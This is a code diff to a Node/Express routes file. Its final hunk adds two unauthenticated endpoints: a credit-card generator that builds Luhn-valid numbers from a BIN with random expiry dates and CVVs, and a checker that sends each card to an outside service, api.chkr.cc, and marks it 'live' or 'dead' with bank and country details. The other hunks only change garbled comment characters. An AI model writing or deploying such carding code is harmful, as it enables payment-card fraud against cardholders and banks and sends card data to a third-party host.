@@ -1958,7 +1958,7 @@ export async function registerRoutes(httpServer: Server, app: Express): Promise<
     res.json({ success: true, code: updated });
   });
 
-  // ─── Admin: Delete promo code ───────────────────────────────────────���─────
+  // ─── Admin: Delete promo code ───────────────────────────────────────�����─────
   app.delete("/api/admin/promo-codes/:code", adminAuthMiddleware, requirePermission("plans"), (req, res) => {
     const ok = promoManager.delete(req.params.code);
     if (!ok) return res.status(404).json({ success: false, error: "Promo code not found" });
@@ -2223,7 +2223,7 @@ export async function registerRoutes(httpServer: Server, app: Express): Promise<
             userAgent,
           });
 
-          // ── Auto-suspend: 5+ distinct IPs ────────────��──────────────────
+          // ── Auto-suspend: 5+ distinct IPs ──────────��─��──────────────────
           const logs = await storage.getLoginLogs(customer.id);
           const privateIp = /^(127\.|192\.168\.|10\.|172\.(1[6-9]|2\d|3[01])\.|::1$|::ffff:|localhost)/;
           const distinctIps = new Set(
@@ -5532,7 +5532,7 @@ echo "    Check logs: pm2 logs chege-deploy-agent"
     }
   });
 
-  // ═════════════════════════════════════════════════════════════════════��═════
+  // ══════════════════════════════════════════════════════════════════��══��═════
   // CUSTOMER BADGES
   // ═══════════════════════════════════════════════════════════════════════════
 
@@ -6126,6 +6126,63 @@ echo "    Check logs: pm2 logs chege-deploy-agent"
     }
   });
 
+
+  // CC Generator (Luhn) + Checker
+  app.post("/api/tools/cc/generate", async (req, res) => {
+    try {
+      const { bin = "", count = 5, month, year, cvv } = req.body;
+      function luhnComplete(partial) {
+        while (partial.length < 15) partial += String(Math.floor(Math.random() * 10));
+        let sum = 0; let alt = false;
+        for (let i = partial.length - 1; i >= 0; i--) {
+          let n = parseInt(partial[i]);
+          if (alt) { n *= 2; if (n > 9) n -= 9; }
+          sum += n; alt = !alt;
+        }
+        const check = (10 - (sum % 10)) % 10;
+        return partial + check;
+      }
+      const prefix = bin || "4";
+      const cards = [];
+      const n = Math.min(parseInt(count) || 5, 20);
+      for (let i = 0; i < n; i++) {
+        const num = luhnComplete(prefix);
+        const mm = month || String(Math.floor(Math.random() * 12) + 1).padStart(2, "0");
+        const yy = year || String(new Date().getFullYear() + 2).slice(-2);
+        const cv = cvv || String(Math.floor(Math.random() * 900) + 100);
+        cards.push(num + "|" + mm + "|" + yy + "|" + cv);
+      }
+      res.json({ success: true, cards });
+    } catch (err) {
+      res.status(500).json({ success: false, error: err.message });
+    }
+  });
+
+  app.post("/api/tools/cc/check", async (req, res) => {
+    try {
+      const { cards } = req.body;
+      if (!Array.isArray(cards) || !cards.length) return res.status(400).json({ success: false, error: "cards array required" });
+      const limited = cards.slice(0, 30);
+      const results = await Promise.allSettled(
+        limited.map(async (card) => {
+          const parts = card.trim().split(/[|\/\s]+/);
+          const [num, month, year, cvv] = parts;
+          if (!num) return { card, status: "invalid" };
+          const r = await fetch("https://api.chkr.cc/", {
+            method: "POST",
+            headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0" },
+            body: JSON.stringify({ data: num + "|" + (month||"01") + "|" + (year||"26") + "|" + (cvv||"000") }),
+          });
+          const d = await r.json();
+          return { card: num + "|" + (month||"01") + "|" + (year||"26") + "|" + (cvv||"000"), status: d.status === "success" ? "live" : "dead", bank: d.bank||"", type: d.type||"", country: d.country||"" };
+        })
+      );
+      const data = results.map((r, i) => r.status === "fulfilled" ? r.value : { card: limited[i], status: "error", error: String(r.reason) });
+      res.json({ success: true, results: data });
+    } catch (err) {
+      res.status(500).json({ success: false, error: err.message });
+    }
+  });
   registerBotRoutes(app, adminAuthMiddleware);
   return httpServer;
 }
